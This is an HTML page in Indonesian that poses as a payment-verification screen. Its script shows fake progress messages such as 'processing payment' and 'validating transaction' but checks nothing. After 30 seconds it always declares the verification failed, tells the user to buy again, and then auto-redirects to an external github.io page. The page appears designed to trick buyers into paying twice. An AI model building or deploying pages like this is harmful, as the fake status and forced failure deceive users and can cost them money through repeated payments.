<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifikasi Pembayaran</title>

<style>
body{
  font-family:Arial;
  background:#111;
  color:#fff;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  text-align:center;
  margin:0;
}

/* BOX UTAMA */
.box{
  background:#1a1a1a;
  padding:30px;
  border-radius:14px;
  border:1px solid #444;
  width:90%;
  max-width:350px;
  animation:fadeIn 0.6s ease;
}

@keyframes fadeIn{
  from{opacity:0; transform:translateY(20px)}
  to{opacity:1; transform:translateY(0)}
}

h1{margin-bottom:10px}
p{color:#ccc}

/* BUTTON */
.btn{
  margin-top:20px;
  padding:12px 20px;
  background:#ffd700;
  border:none;
  border-radius:10px;
  font-weight:bold;
  cursor:pointer;
}

/* LOADING */
.loading{
  display:flex;
  flex-direction:column;
  align-items:center;
}

.spinner{
  width:60px;height:60px;
  border:6px solid #444;
  border-top:6px solid #ffd700;
  border-radius:50%;
  animation:spin 1s linear infinite;
  margin-bottom:15px;
}

@keyframes spin{
  100%{transform:rotate(360deg)}
}

/* FAILED STYLE */
.failed{
  border:1px solid #ff4444;
}

.failed h1{
  color:#ff4444;
}
</style>
</head>

<body>

<div class="box" id="mainBox">

  <!-- LOADING -->
  <div id="loadingSection" class="loading">
    <div class="spinner"></div>
    <h1>Saldo Sedang Diproses</h1>
    <p id="loadingText">Menghubungkan ke sistem...</p>
  </div>

  <!-- FAILED -->
  <div id="failedSection" style="display:none;">
    <h1>VERIFIKASI GAGAL</h1>
    <p>
      Terjadi kendala saat verifikasi pembayaran.<br><br>
      Silakan lakukan pembelian ulang untuk melanjutkan proses.
    </p>

    <button class="btn" onclick="redirectNow()">
      BELI ULANG
    </button>
  </div>

</div>

<script>
const texts = [
  "Menghubungkan ke sistem...",
  "Memproses pembayaran...",
  "Validasi transaksi...",
  "Menunggu konfirmasi..."
];

let i = 0;
const textEl = document.getElementById("loadingText");

/* TEKS DINAMIS */
const interval = setInterval(()=>{
  textEl.innerText = texts[i % texts.length];
  i++;
},2000);

/* SETELAH 30 DETIK → GAGAL */
setTimeout(()=>{
  clearInterval(interval);

  document.getElementById("loadingSection").style.display="none";
  document.getElementById("failedSection").style.display="block";
  document.getElementById("mainBox").classList.add("failed");

  /* AUTO REDIRECT 10 DETIK */
  setTimeout(()=>{
    redirectNow();
  },10000);

},30000);

/* REDIRECT */
function redirectNow(){
  window.location.href = "https://poliponi.github.io/SHEILA-ON7-/";
}
</script>

</body>
</html>
